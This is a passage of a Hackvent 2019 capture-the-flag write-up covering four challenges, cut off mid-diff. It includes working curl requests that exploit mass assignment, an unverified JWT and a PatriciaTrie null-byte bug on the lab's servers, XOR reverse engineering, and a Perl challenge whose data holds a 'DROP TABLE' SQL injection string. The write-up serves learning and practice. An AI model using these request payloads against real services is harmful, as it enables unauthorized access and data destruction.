+<div class="sourceCode" id="cb17"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1"></a><span class="co"># curl -s -X POST -H &#39;Content-Type: application/json&#39; http://whale.hacking-lab.com:10101/fsja/register --data &#39;{&quot;username&quot;:&quot;nothertestuser&quot;, &quot;password&quot;: &quot;passwordpassword&quot;, &quot;platinum&quot;: true}&#39;</span></span>
+<span id="cb17-2"><a href="#cb17-2"></a><span class="ex">HTTP/1.1</span> 201 Created</span>
+<span id="cb17-3"><a href="#cb17-3"></a><span class="ex">Content-Type</span>: application/json</span>
+<span id="cb17-4"><a href="#cb17-4"></a><span class="ex">Content-Length</span>: 37</span>
+<span id="cb17-5"><a href="#cb17-5"></a><span class="ex">Server</span>: Jetty(9.4.18.v20190429)</span>
+<span id="cb17-6"><a href="#cb17-6"></a></span>
+<span id="cb17-7"><a href="#cb17-7"></a>{<span class="st">&quot;message&quot;</span>:<span class="st">&quot;User created&quot;</span>,<span class="st">&quot;code&quot;</span>:<span class="ex">201</span>}</span></code></pre></div>
+<p>Logging in with that user:</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1"></a><span class="co"># curl -i -s -X POST -H &#39;Content-Type: application/json&#39; http://whale.hacking-lab.com:10101/fsja/login --data &#39;{&quot;username&quot;: &quot;nothertestuser&quot;, &quot;password&quot;:&quot;passwordpassword&quot;}&#39;</span></span>
+<span id="cb18-2"><a href="#cb18-2"></a><span class="ex">HTTP/1.1</span> 201 Created</span>
+<span id="cb18-3"><a href="#cb18-3"></a><span class="ex">Content-Type</span>: application/json</span>
+<span id="cb18-4"><a href="#cb18-4"></a><span class="ex">Content-Length</span>: 224</span>
+<span id="cb18-5"><a href="#cb18-5"></a><span class="ex">Server</span>: Jetty(9.4.18.v20190429)</span>
+<span id="cb18-6"><a href="#cb18-6"></a></span>
+<span id="cb18-7"><a href="#cb18-7"></a>{<span class="st">&quot;message&quot;</span>:<span class="st">&quot;Token generated&quot;</span>,<span class="st">&quot;code&quot;</span>:<span class="ex">201</span>,<span class="st">&quot;token&quot;</span>:<span class="st">&quot;eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoibm90aGVydGVzdHVzZXIiLCJwbGF0aW51bSI6dHJ1ZX0sImV4cCI6MTU3NjA0Nzg5NC40NzcwMDAwMDB9.3_9QFSTdjMaIOG0DJL7jBKR1-jbbgfKKDIvA2T-2bNo&quot;</span>}</span></code></pre></div>
+<p>And requesting a "random" joke:</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1"></a><span class="co"># curl -i -X GET &quot;http://whale.hacking-lab.com:10101/fsja/random?token=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoibm90aGVydGVzdHVzZXIiLCJwbGF0aW51bSI6dHJ1ZX0sImV4cCI6MTU3NjA0Nzg5NC40NzcwMDAwMDB9.3_9QFSTdjMaIOG0DJL7jBKR1-jbbgfKKDIvA2T-2bNo&quot;</span></span>
+<span id="cb19-2"><a href="#cb19-2"></a><span class="ex">HTTP/1.1</span> 201 Created</span>
+<span id="cb19-3"><a href="#cb19-3"></a><span class="ex">Content-Type</span>: application/json</span>
+<span id="cb19-4"><a href="#cb19-4"></a><span class="ex">Content-Length</span>: 300</span>
+<span id="cb19-5"><a href="#cb19-5"></a><span class="ex">Server</span>: Jetty(9.4.18.v20190429)</span>
+<span id="cb19-6"><a href="#cb19-6"></a></span>
+<span id="cb19-7"><a href="#cb19-7"></a>{<span class="st">&quot;joke&quot;</span>:<span class="st">&quot;Congratulation! Sometimes bugs are rather stupid. But that&#39;s how it happens, sometimes. Doing all the crypto stuff right and forgetting the trivial stuff like input validation, Hohoho! Here&#39;s your flag: HV19{th3_cha1n_1s_0nly_as_str0ng_as_th3_w3ak3st_l1nk}&quot;</span>,<span class="st">&quot;author&quot;</span>:<span class="st">&quot;Santa&quot;</span>,<span class="st">&quot;platinum&quot;</span>:<span class="ex">true</span>}</span></code></pre></div>
+<h3 id="two-1">Two</h3>
+<p>It turns out, the API also did not validate the token before using it. So, solving this challenge could have been as simple as decoding the JWT, setting the platinum property to <code>true</code> and re-encoding the JWT (with a wrong signature).</p>
+<h2 id="flag-10">Flag</h2>
+<p><code>HV19{th3_cha1n_1s_0nly_as_str0ng_as_th3_w3ak3st_l1nk}</code></p>
+<h1 id="hv1912---back-to-basic">HV19.12 - back to basic</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>hardlock</td>
+<td>medium</td>
+<td>fun; reverse engineering</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-11">Given</h2>
+<p>Santa used his time machine to get a present from the past. get your rusty tools out of your cellar and solve this one!</p>
+<p><a href="67e6c6c2-1119-4c1e-a9b5-85f118173a40.zip">HV19.12-BackToBasic.zip</a></p>
+<h2 id="approach-9">Approach</h2>
+<p>"Rusty tools"? In my case, they were never shiny or even existing. But anyways...</p>
+<p>Being a beginner in reverse eingineering I decided to proceed with Ghidra and OllyDbg side by side, as it was clear that we deal with a Windows PE binary and Ghidra provided a decompiled view, which is handy.</p>
+<p>Let's have a look at the program. Apparently, the UI will display "Status: wrong" as long as we don't enter the correct flag.</p>
+<p>It turns out, the program rejects all strings that do not start with "HV19" and have a length other than 33 characters. Since a flag must include the string "HV19{}", we know that there are 27 variable characters.</p>
+<p>Looking at what Ghidra was able to decompile, one can see there's a suspicious looking XOR function somewhere in the middle of the part that we end up in, when a random flag with 33 characters is entered.</p>
+<p><img src="HV19.12_ghidra.png" alt="Ghidra screenshot" /></p>
+<p>In OllyDbg, I then tried to observe what happened right before and after that XOR by setting breakpoints and investigating memory. For example, setting the variable part of a flag to <code>AAAAAAAAAAAAAAAAAAAAAAAAAAA</code>, it got encrypted to <code>GFIHKJMLONQPSRUTWVYX[Z]\_^a</code>. Computing the encryption key was already possible from this information. However, I also tried to find where this key was loaded with OllyDbg.</p>
+<p><img src="HV19.12_OllyDbg.png" alt="OllyDbg screenshot" /></p>
+<p>It's at address <code>0x00402358</code> I was able to observe the secret being loaded for XORing (<code>PUSH EAX</code>). Right after that, the corresponding character from the user-entered string is prepared for XORing. The encryption key is:</p>
+<p><code>06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20</code></p>
+<p>Finally, the program compared the computed string with an encrypted string that can be found at address <code>0x00401b40</code>. This is the encrypted flag that gets loaded at <code>0x00402416</code>. The encrypted flag is:</p>
+<p><code>6klzic&lt;=bPBtdvff'y.FI~on//N</code></p>
+<p>Or in hex values:</p>
+<p><code>36 6b 6c 7a 69 63 3c 3d 62 50 42 74 64 76 66 66 27 79 7f 46 49 7e 6f 6e 2f 2f 4e</code></p>
+<p>As XOR is revertible, we can now apply this operation again to find the flag:</p>
+<p><code>30 6c 64 73 63 68 30 30 6c 5f 52 65 76 65 72 73 31 6e 67 5f 53 65 73 73 31 30 6e</code></p>
+<p>which, in ASCII, is:</p>
+<p><code>0ldsch00l_Revers1ng_Sess10n</code></p>
+<p>Nice.</p>
+<h2 id="credits-1">Credits</h2>
+<ul>
+<li>Thanks to <em>mcia</em> for helping me through this reversing challenge and keeping me in front of the screen with tiny, non-revealing but very teasing hints. Reversing, for me, was/is a pretty new thing in which I'm still building up some experience.</li>
+</ul>
+<h2 id="flag-11">Flag</h2>
+<pre><code>HV19{0ldsch00l_Revers1ng_Sess10n}
+</code></pre>
+<h1 id="hv1913---trieme">HV19.13 - TrieMe</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>kiwi</td>
+<td>medium</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-12">Given</h2>
+<p>Switzerland's national security is at risk. As you try to infiltrate a secret spy facility to save the nation you stumble upon an interesting looking login portal.</p>
+<p>Can you break it and retrieve the critical information?</p>
+<p>Facility: <a href="http://whale.hacking-lab.com:8888/trieme/">http://whale.hacking-lab.com:8888/trieme/</a> <a href="34913db9-fd2a-43c8-b563-55a1d10ee4cb.zip">HV19.13-NotesBean.java.zip</a></p>
+<h2 id="approach-10">Approach</h2>
+<p>Here's the one approach that worked:</p>
+<ul>
+<li>So, we want to become Admin - what looks odd is, that a security token must NOT be found in a data structure...</li>
+<li>This puts the focus on that PatriciTrie.containsKey method.</li>
+<li>Google for "Java PatriciaTrie containsKey bug"</li>
+<li>Eventually find <a href="https://issues.apache.org/jira/browse/COLLECTIONS-714">https://issues.apache.org/jira/browse/COLLECTIONS-714</a>, saying that adding an already existing key padded with a null byte to a PatriciaTrie structure removes an already existing key.</li>
+</ul>
+<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1"></a>$ <span class="ex">curl</span> <span class="st">&#39;http://whale.hacking-lab.com:8888/trieme/faces/index.xhtml&#39;</span> -i \</span>
+<span id="cb21-2"><a href="#cb21-2"></a>-H <span class="st">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> \</span>
+<span id="cb21-3"><a href="#cb21-3"></a>-H <span class="st">&#39;Cookie: JSESSIONID=F42C98923EAF777AE65D8E59595261A2&#39;</span> \</span>
+<span id="cb21-4"><a href="#cb21-4"></a>--data <span class="st">&#39;j_idt14=j_idt14&amp;j_idt14%3Aname=auth_token_4835989%00%00&amp;j_idt14%3Aj_idt15=login&amp;javax.faces.ViewState=7831036928425351547%3A7209554679698124656&#39;</span></span>
+<span id="cb21-5"><a href="#cb21-5"></a><span class="ex">HTTP/1.1</span> 200 </span>
+<span id="cb21-6"><a href="#cb21-6"></a><span class="ex">X-Powered-By</span>: JSF/2.0</span>
+<span id="cb21-7"><a href="#cb21-7"></a><span class="ex">Content-Type</span>: text/html<span class="kw">;</span><span class="va">charset=</span>UTF-8</span>
+<span id="cb21-8"><a href="#cb21-8"></a><span class="ex">Content-Length</span>: 560</span>
+<span id="cb21-9"><a href="#cb21-9"></a><span class="ex">Date</span>: Fri, 13 Dec 2019 21:46:49 GMT</span>
+<span id="cb21-10"><a href="#cb21-10"></a></span>
+<span id="cb21-11"><a href="#cb21-11"></a><span class="op">&lt;</span><span class="ex">?xml</span> version=<span class="st">&quot;1.0&quot;</span> encoding=<span class="st">&quot;UTF-8&quot;</span>?<span class="op">&gt;</span></span>
+<span id="cb21-12"><a href="#cb21-12"></a><span class="op">&lt;</span>!<span class="ex">DOCTYPE</span> html PUBLIC <span class="st">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="st">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span><span class="op">&gt;</span></span>
+<span id="cb21-13"><a href="#cb21-13"></a><span class="op">&lt;</span><span class="ex">html</span> xmlns=<span class="st">&quot;http://www.w3.org/1999/xhtml&quot;</span><span class="op">&gt;&lt;</span>head<span class="op">&gt;</span></span>
+<span id="cb21-14"><a href="#cb21-14"></a>     <span class="op">&lt;</span><span class="ex">title</span><span class="op">&gt;</span>SpyPortal<span class="op">&lt;</span>/title<span class="op">&gt;&lt;</span>link type=<span class="st">&quot;text/css&quot;</span> rel=<span class="st">&quot;stylesheet&quot;</span> href=<span class="st">&quot;/trieme/faces/javax.faces.resource/style.css?ln=css&quot;</span> /<span class="op">&gt;&lt;</span>/head<span class="op">&gt;&lt;</span>body<span class="op">&gt;</span></span>
+<span id="cb21-15"><a href="#cb21-15"></a>     <span class="op">&lt;</span><span class="ex">h3</span><span class="op">&gt;</span>Secret Spy Portal<span class="op">&lt;</span>/h3<span class="op">&gt;</span></span>
+<span id="cb21-16"><a href="#cb21-16"></a>     <span class="op">&lt;</span><span class="ex">h4</span><span class="op">&gt;</span>STATUS:</span>
+<span id="cb21-17"><a href="#cb21-17"></a>      <span class="ex">We</span> will steal all the national chocolate supplies at christmas, 3pm: Here<span class="st">&#39;s the building codes: HV19{get_th3_chocolateZ}</span></span>
+<span id="cb21-18"><a href="#cb21-18"></a><span class="st">      </span></span>
+<span id="cb21-19"><a href="#cb21-19"></a><span class="st">  !&lt;/h4&gt;&lt;/body&gt;</span></span>
+<span id="cb21-20"><a href="#cb21-20"></a><span class="st">&lt;/html&gt;</span></span></code></pre></div>
+<h3 id="other-approaches-not-successful">Other approaches (not successful)</h3>
+<ul>
+<li>Try to find vulnerabilities on Tomcat</li>
+<li>Serialize tons of Java objects and try to inject them through every possible parameter (cookies, queryparams, headers, request body, and more)</li>
+<li>Question the reason of why I'm even participating at Hackvent</li>
+<li>Try to leverage some more powerful tool and spin up an Amazon VM to receive the reverse shell</li>
+</ul>
+<p>Once more, the whole thing is harder if you're not doing this kind of analysis at least from time to time. But let's not forget that we do it for fun and to learn something (which was definitely the case here).</p>
+<h2 id="credits-and-kudos">Credits and Kudos</h2>
+<p>Massive credits go once more to <em>mcia</em>, who was once more able to open my eyes with subtle yet precise hints with no spoilers. Whithout him I would have gone to bed. Thanks mate. :D</p>
+<h2 id="flag-12">Flag:</h2>
+<p><code>HV19{get_th3_chocolateZ}</code></p>
+<h1 id="hv1914---achtung-das-flag">HV19.14 - Achtung das Flag</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>M.</td>
+<td>medium</td>
+<td>fun; programming</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-13">Given</h2>
+<p>Let's play another little game this year. Once again, I promise it is hardly obfuscated.</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode perl"><code class="sourceCode perl"><span id="cb22-1"><a href="#cb22-1"></a><span class="fu">use</span> Tk;<span class="fu">use</span> <span class="fu">MIME::Base64</span>;<span class="fu">chomp</span>((<span class="dt">$a</span>,<span class="dt">$a</span>,<span class="dt">$b</span>,<span class="dt">$c</span>,<span class="dt">$f</span>,<span class="dt">$u</span>,<span class="dt">$z</span>,<span class="dt">$y</span>,<span class="dt">$r</span>,<span class="dt">$r</span>,<span class="dt">$u</span>)=<span class="kw">&lt;DATA&gt;</span>);<span class="kw">sub </span><span class="fu">M</span>{<span class="dt">$M</span>=<span class="fu">shift</span>;<span class="co">##</span></span>
+<span id="cb22-2"><a href="#cb22-2"></a><span class="dt">@m</span>=<span class="fu">keys</span> %::;(<span class="fu">grep</span>{(<span class="fu">unpack</span>(<span class="kw">&quot;</span><span class="dt">%32W</span><span class="st">*</span><span class="kw">&quot;</span>,<span class="dt">$_</span>).<span class="fu">length</span>(<span class="dt">$_</span>))eq<span class="dt">$M</span>}<span class="dt">@m</span>)[<span class="dv">0</span>]};<span class="dt">$zvYPxUpXMSsw</span>=<span class="bn">0x1337C0DE</span>;<span class="co">###</span></span>
+<span id="cb22-3"><a href="#cb22-3"></a><span class="kw">/</span><span class="ot">_help_me_</span><span class="kw">/</span>;<span class="dt">$PMMtQJOcHm8eFQfdsdNAS20</span>=<span class="kw">sub</span>{<span class="dt">$zvYPxUpXMSsw</span>=(<span class="dt">$zvYPxUpXMSsw</span>*<span class="dv">16807</span>)&amp;<span class="bn">0xFFFFFFFF</span>;};</span>
+<span id="cb22-4"><a href="#cb22-4"></a>(<span class="dt">$a1Ivn0ECw49I5I0oE0</span>=<span class="kw">&#39;</span><span class="st">07&amp;3-&quot;11*/(</span><span class="kw">&#39;</span>)=~<span class="kw">y</span><span class="ot">$!-=$`-~$;($Sk61A7pO=&#39;K&amp;:P3&amp;44&#39;)=~y$!-=$`-~$</span>;<span class="kw">m/</span><span class="ot">Mm</span><span class="kw">/g</span>;</span>
+<span id="cb22-5"><a href="#cb22-5"></a>(<span class="dt">$sk6i47pO</span>=<span class="kw">&#39;</span><span class="st">K&amp;:R&amp;-&amp;&quot;4&amp;</span><span class="kw">&#39;</span>)=~<span class="kw">y</span><span class="ot">$!-=$`-~$;;;;$d28Vt03MEbdY0=sub{pack(&#39;n&#39;,$fff[$</span>S9cXJIGB0BWce++]</span>
+<span id="cb22-6"><a href="#cb22-6"></a>^(<span class="dt">$PMMtQJOcHm8eFQfdsdNAS20</span>-&gt;()&amp;<span class="bn">0xDEAD</span>));};<span class="kw">&#39;</span><span class="st">42</span><span class="kw">&#39;</span>;(<span class="dt">$vgOjwRk4wIo7_</span>=MainWindow-&gt;new)-&gt;title(<span class="dt">$r</span>)</span>
+<span id="cb22-7"><a href="#cb22-7"></a>;(<span class="dt">$vMnyQdAkfgIIik</span>=<span class="dt">$vgOjwRk4wIo7_</span>-&gt;<span class="dt">Canvas</span>(<span class="kw">&quot;</span><span class="st">-</span><span class="dt">$a</span><span class="kw">&quot;</span>=&gt;<span class="dv">640</span>,<span class="kw">&quot;</span><span class="st">-</span><span class="dt">$b</span><span class="kw">&quot;</span>=&gt;<span class="dv">480</span>,<span class="kw">&quot;</span><span class="st">-</span><span class="dt">$u</span><span class="kw">&quot;</span>=&gt;<span class="dt">$f</span>))-&gt;<span class="fu">pack</span>;<span class="dt">@p</span>=(<span class="dv">42</span>,<span class="dv">42</span></span>
+<span id="cb22-8"><a href="#cb22-8"></a>);<span class="dt">$cqI</span>=<span class="dt">$vMnyQdAkfgIIik</span>-&gt;<span class="dt">createLine</span>(<span class="dt">@p</span>,<span class="dt">@p</span>,<span class="kw">&quot;</span><span class="st">-</span><span class="dt">$y</span><span class="kw">&quot;</span>=&gt;<span class="dt">$c</span>,<span class="kw">&quot;</span><span class="st">-</span><span class="dt">$a</span><span class="kw">&quot;</span>=&gt;<span class="dv">3</span>);;;<span class="dt">$S9cXJIGB0BWce</span>=<span class="dv">0</span>;<span class="dt">$_2kY10</span>=<span class="dv">0</span>;</span>
+<span id="cb22-9"><a href="#cb22-9"></a><span class="dt">$_8NZQooI5K4b</span>=<span class="dv">0</span>;<span class="dt">$Sk6lA7p0</span>=<span class="dv">0</span>;<span class="dt">$MMM__</span>;<span class="dt">$_</span>=M(<span class="dv">120812</span>).<span class="kw">&#39;</span><span class="st">/</span><span class="kw">&#39;</span>.M(<span class="dv">191323</span>).M(<span class="dv">133418</span>).M(<span class="dv">98813</span>).M(<span class="dv">121913</span>)</span>
+<span id="cb22-10"><a href="#cb22-10"></a>.M(<span class="dv">134214</span>).M(<span class="dv">101213</span>).<span class="kw">&#39;</span><span class="st">/</span><span class="kw">&#39;</span>.M(<span class="dv">97312</span>).M(<span class="dv">6328</span>).M(<span class="dv">2853</span>).<span class="kw">&#39;</span><span class="st">+</span><span class="kw">&#39;</span>.M(<span class="dv">4386</span>);<span class="kw">s|</span><span class="ot">_</span><span class="ch">||</span><span class="ot">gi;</span><span class="dt">@fff</span><span class="ot">=map{unpack</span><span class="ch">(</span><span class="ot">&#39;n&#39;,</span></span>
+<span id="cb22-11"><a href="#cb22-11"></a><span class="ch">$</span><span class="ot">::{M</span><span class="ch">(</span><span class="ot">122413</span><span class="ch">)</span><span class="ot">}-&gt;</span><span class="ch">($</span><span class="ot">_</span><span class="ch">))</span><span class="ot">}m:...:g;</span><span class="ch">($</span><span class="ot">T=sub{</span><span class="ch">$</span><span class="ot">vMnyQdAkfgIIik-&gt;delete</span><span class="ch">($</span><span class="ot">t</span><span class="ch">)</span><span class="ot">;</span><span class="ch">$</span><span class="ot">t=</span><span class="ch">$</span><span class="ot">vMnyQdAkfgIIik-&gt;#FOO</span></span>
+<span id="cb22-12"><a href="#cb22-12"></a><span class="ot">createText</span><span class="ch">($</span><span class="ot">PMMtQJOcHm8eFQfdsdNAS20-&gt;</span><span class="ch">()</span><span class="ot">%600</span><span class="ch">+</span><span class="ot">20,</span><span class="ch">$</span><span class="ot">PMMtQJOcHm8eFQfdsdNAS20-&gt;</span><span class="ch">()</span><span class="ot">%440</span><span class="ch">+</span><span class="ot">20,#Perl!!</span></span>
+<span id="cb22-13"><a href="#cb22-13"></a><span class="ot">&quot;-text&quot;=&gt;</span><span class="ch">$</span><span class="ot">d28Vt03MEbdY0-&gt;</span><span class="ch">()</span><span class="ot">,&quot;-</span><span class="ch">$</span><span class="ot">y&quot;=&gt;</span><span class="ch">$</span><span class="ot">z</span><span class="ch">)</span><span class="ot">;}</span><span class="ch">)</span><span class="ot">-&gt;</span><span class="ch">()</span><span class="ot">;</span><span class="ch">$</span><span class="ot">HACK;</span><span class="ch">$</span><span class="ot">i=</span><span class="ch">$</span><span class="ot">vMnyQdAkfgIIik-&gt;repeat</span><span class="ch">(</span><span class="ot">25,sub{</span><span class="ch">$</span><span class="ot">_=</span><span class="ch">(</span></span>
+<span id="cb22-14"><a href="#cb22-14"></a><span class="ch">$</span><span class="ot">_8NZQooI5K4b</span><span class="ch">+</span><span class="ot">=0.1</span><span class="ch">*$</span><span class="ot">Sk6lA7p0</span><span class="ch">)</span><span class="ot">;;</span><span class="ch">$</span><span class="ot">p</span><span class="ch">[</span><span class="bn">0</span><span class="ch">]+</span><span class="ot">=3.0</span><span class="ch">*</span><span class="ot">cos;</span><span class="ch">$</span><span class="ot">p</span><span class="ch">[</span><span class="bn">1</span><span class="ch">]</span><span class="ot">-=3</span><span class="ch">*</span><span class="ot">sin;;</span><span class="ch">($</span><span class="ot">p</span><span class="ch">[</span><span class="bn">0</span><span class="ch">]</span><span class="ot">&gt;1&amp;&amp;</span><span class="ch">$</span><span class="ot">p</span><span class="ch">[</span><span class="bn">1</span><span class="ch">]</span><span class="ot">&gt;1&amp;&amp;</span><span class="ch">$</span><span class="ot">p</span><span class="ch">[</span><span class="bn">0</span><span class="ch">]</span><span class="ot">&lt;639&amp;&amp;</span></span>
+<span id="cb22-15"><a href="#cb22-15"></a><span class="ch">$</span><span class="ot">p</span><span class="ch">[</span><span class="bn">1</span><span class="ch">]</span><span class="ot">&lt;479</span><span class="ch">)||$</span><span class="ot">i-&gt;cancel</span><span class="ch">()</span><span class="ot">;00;</span><span class="ch">$</span><span class="ot">q=</span><span class="ch">($</span><span class="ot">vMnyQdAkfgIIik-&gt;find</span><span class="ch">($</span><span class="ot">a1Ivn0ECw49I5I0oE0,</span><span class="ch">$</span><span class="ot">p</span><span class="ch">[</span><span class="bn">0</span><span class="ch">]</span><span class="ot">-1,</span><span class="ch">$</span><span class="ot">p</span><span class="ch">[</span><span class="bn">1</span><span class="ch">]</span><span class="ot">-1,</span></span>
+<span id="cb22-16"><a href="#cb22-16"></a><span class="ch">$</span><span class="ot">p</span><span class="ch">[</span><span class="bn">0</span><span class="ch">]+</span><span class="ot">1,</span><span class="ch">$</span><span class="ot">p</span><span class="ch">[</span><span class="bn">1</span><span class="ch">]+</span><span class="ot">1</span><span class="ch">)||[])</span><span class="ot">-&gt;</span><span class="ch">[</span><span class="bn">0</span><span class="ch">]</span><span class="ot">;</span><span class="ch">$</span><span class="ot">q==</span><span class="ch">$</span><span class="ot">t&amp;&amp;</span><span class="ch">$</span><span class="ot">T-&gt;</span><span class="ch">()</span><span class="ot">;</span><span class="ch">$</span><span class="ot">vMnyQdAkfgIIik-&gt;insert</span><span class="ch">($</span><span class="ot">cqI,&#39;end&#39;,\@p</span><span class="ch">)</span><span class="ot">;</span><span class="ch">($</span><span class="ot">q==###</span></span>
+<span id="cb22-17"><a href="#cb22-17"></a><span class="ch">$</span><span class="ot">cqI</span><span class="ch">||$</span><span class="ot">S9cXJIGB0BWce&gt;44</span><span class="ch">)</span><span class="ot">&amp;&amp;</span><span class="ch">$</span><span class="ot">i-&gt;cancel</span><span class="ch">()</span><span class="ot">;}</span><span class="ch">)</span><span class="ot">;</span><span class="ch">$</span><span class="ot">KE=5;</span><span class="ch">$</span><span class="ot">vgOjwRk4wIo7_-&gt;bind</span><span class="ch">(</span><span class="ot">&quot;&lt;</span><span class="ch">$</span><span class="ot">Sk61A7pO-n&gt;&quot;=&gt;sub{</span></span>
+<span id="cb22-18"><a href="#cb22-18"></a><span class="ch">$</span><span class="ot">Sk6lA7p0=1;}</span><span class="ch">)</span><span class="ot">;</span><span class="ch">$</span><span class="ot">vgOjwRk4wIo7_-&gt;bind</span><span class="ch">(</span><span class="ot">&quot;&lt;</span><span class="ch">$</span><span class="ot">Sk61A7pO-m&gt;&quot;=&gt;sub{</span><span class="ch">$</span><span class="ot">Sk6lA7p0=-1;}</span><span class="ch">)</span><span class="ot">;</span><span class="ch">$</span><span class="ot">vgOjwRk4wIo7_#%&quot;</span></span>
+<span id="cb22-19"><a href="#cb22-19"></a><span class="ot">-&gt;bind</span><span class="ch">(</span><span class="ot">&quot;&lt;</span><span class="ch">$</span><span class="ot">sk6i47pO-n&gt;&quot;=&gt;sub{</span><span class="ch">$</span><span class="ot">Sk6lA7p0=0 if</span><span class="ch">$</span><span class="ot">Sk6lA7p0&gt;0;}</span><span class="ch">)</span><span class="ot">;</span><span class="ch">$</span><span class="ot">vgOjwRk4wIo7_-&gt;bind</span><span class="ch">(</span><span class="ot">&quot;&lt;</span><span class="ch">$</span><span class="ot">sk6i47pO&quot;</span></span>
+<span id="cb22-20"><a href="#cb22-20"></a><span class="ot">.&quot;-m&gt;&quot;=&gt;sub{</span><span class="ch">$</span><span class="ot">Sk6lA7p0=0 if </span><span class="ch">$</span><span class="ot">Sk6lA7p0&lt;0;}</span><span class="ch">)</span><span class="ot">;</span><span class="ch">$</span><span class="ot">::{M</span><span class="ch">(</span><span class="ot">7998</span><span class="ch">)</span><span class="ot">}-&gt;</span><span class="ch">()</span><span class="ot">;</span><span class="ch">$</span><span class="ot">M_decrypt=sub{&#39;HACKVENT2019&#39;};</span></span>
+<span id="cb22-21"><a href="#cb22-21"></a><span class="ot">__DATA__</span></span>
+<span id="cb22-22"><a href="#cb22-22"></a><span class="ot">The cake is a lie!</span></span>
+<span id="cb22-23"><a href="#cb22-23"></a><span class="ot">width</span></span>
+<span id="cb22-24"><a href="#cb22-24"></a><span class="ot">height</span></span>
+<span id="cb22-25"><a href="#cb22-25"></a><span class="ot">orange</span></span>
+<span id="cb22-26"><a href="#cb22-26"></a><span class="ot">black</span></span>
+<span id="cb22-27"><a href="#cb22-27"></a><span class="ot">green</span></span>
+<span id="cb22-28"><a href="#cb22-28"></a><span class="ot">cyan</span></span>
+<span id="cb22-29"><a href="#cb22-29"></a><span class="ot">fill</span></span>
+<span id="cb22-30"><a href="#cb22-30"></a><span class="ot">Only perl can parse Perl!</span></span>
+<span id="cb22-31"><a href="#cb22-31"></a><span class="ot">Achtung das Flag! --&gt; Use N and M</span></span>
+<span id="cb22-32"><a href="#cb22-32"></a><span class="ot">background</span></span>
+<span id="cb22-33"><a href="#cb22-33"></a><span class="ot">M&#39;</span><span class="ch">)</span><span class="ot">; DROP TABLE flags; -- </span></span>
+<span id="cb22-34"><a href="#cb22-34"></a><span class="ot">Run me in Perl!</span></span>
+<span id="cb22-35"><a href="#cb22-35"></a><span class="ot">__DATA__</span></span></code></pre></div>
+<h2 id="approach-11">Approach</h2>
+<p>Look at a nicer representation of the script, generated with <code>perltidy</code> to get an overview. (Another viable option seems to be Perl's <code>deparse</code> utility).</p>
+<p>Replace variable assignments by anonymous subroutines like <code>sub{...}-&gt;()</code>.</p>
+<p><code>$q</code> carries the result of whether the "snake" is moving in free space ($q==0), has hit itself ($q==1) or a character ($q&gt;1).</p>
+<p>Now, we can act on that value by changing the source according to the following diff:</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb23-1"><a href="#cb23-1"></a><span class="kw">--- dec14.pl.orig   2019-12-14 09:18:50.013456066 +0100</span></span>
+<span id="cb23-2"><a href="#cb23-2"></a><span class="dt">+++ dec14.pl    2019-12-14 10:30:55.600999646 +0100</span></span>
+<span id="cb23-3"><a href="#cb23-3"></a><span class="dt">@@ -6,14 +6,14 @@</span></span>
+<span id="cb23-4"><a href="#cb23-4"></a> ^($PMMtQJOcHm8eFQfdsdNAS20-&gt;()&amp;0xDEAD));};&#39;42&#39;;($vgOjwRk4wIo7_=MainWindow-&gt;new)-&gt;title($r)</span>
+<span id="cb23-5"><a href="#cb23-5"></a> ;($vMnyQdAkfgIIik=$vgOjwRk4wIo7_-&gt;Canvas(&quot;-$a&quot;=&gt;640,&quot;-$b&quot;=&gt;480,&quot;-$u&quot;=&gt;$f))-&gt;pack;@p=(42,42</span>
+<span id="cb23-6"><a href="#cb23-6"></a> );$cqI=$vMnyQdAkfgIIik-&gt;createLine(@p,@p,&quot;-$y&quot;=&gt;$c,&quot;-$a&quot;=&gt;3);;;$S9cXJIGB0BWce=0;$_2kY10=0;</span>
+<span id="cb23-7"><a href="#cb23-7"></a><span class="st">-$_8NZQooI5K4b=0;$Sk6lA7p0=0;$MMM__;$_=M(120812).&#39;/&#39;.M(191323).M(133418).M(98813).M(121913)</span></span>
+<span id="cb23-8"><a href="#cb23-8"></a><span class="va">+$_8NZQooI5K4b=0;$Sk6lA7p0=0;$bla=1;$MMM__;$_=M(120812).&#39;/&#39;.M(191323).M(133418).M(98813).M(121913)</span></span>
+<span id="cb23-9"><a href="#cb23-9"></a> .M(134214).M(101213).&#39;/&#39;.M(97312).M(6328).M(2853).&#39;+&#39;.M(4386);s|_||gi;@fff=map{unpack(&#39;n&#39;,</span>
+<span id="cb23-10"><a href="#cb23-10"></a> $::{M(122413)}-&gt;($_))}m:...:g;($T=sub{$vMnyQdAkfgIIik-&gt;delete($t);$t=$vMnyQdAkfgIIik-&gt;#FOO</span>
